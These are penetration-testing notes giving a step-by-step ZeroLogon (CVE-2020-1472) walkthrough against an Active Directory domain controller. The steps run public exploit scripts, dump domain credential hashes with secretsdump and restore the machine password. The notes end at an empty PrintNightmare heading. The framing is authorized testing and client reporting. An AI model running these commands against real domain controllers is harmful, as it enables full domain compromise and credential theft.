# Additional Active Directory Attacks

## Abusing ZeroLogon

- Make sure to restore if you use this attack, otherwise the domain controller will be broken. You can also use the tester and tell the client in your report (to avoid breaking anything).
- Clone https://github.com/dirkjanm/CVE-2020-1472
- https://github.com/SecuraBV/CVE-2020-1472 to copy the tester file **`zerologon_tester.py`**
- All we need for the zero logon tester is the name of the Domain Controller (HYDRA-DC) and the IP address: `python3 zerologon_tester.py <DOMAIN CONTROLLER> <DC-IP>`
- Next, to run the exploit all we need to do is use: `python3 cve-2020-1472-exploit.py <DOMAIN CONTROLLER> <DC-IP>`
- To check, use secretsdump: `secretsdump.py -just-dc <DOMAIN>/<DOMAIN CONTROLLER>\$@<DC-IP>`
- Now to restore, first copy the administrator hash and `secretsdump.py administrator@<DC-IP> -hash <hash>`. Copy the entire `plain_password_hex`.
- Back in the exploit folder run `python3 restorepassword.py <DOMAIN>/<DOMAIN CONTROLLER>@<DOMAIN CONTROLLER> -target-ip <DC-IP> -hexpass <password hex>`

## PrintNightmare (CVE-2021-1675) Walkthrough
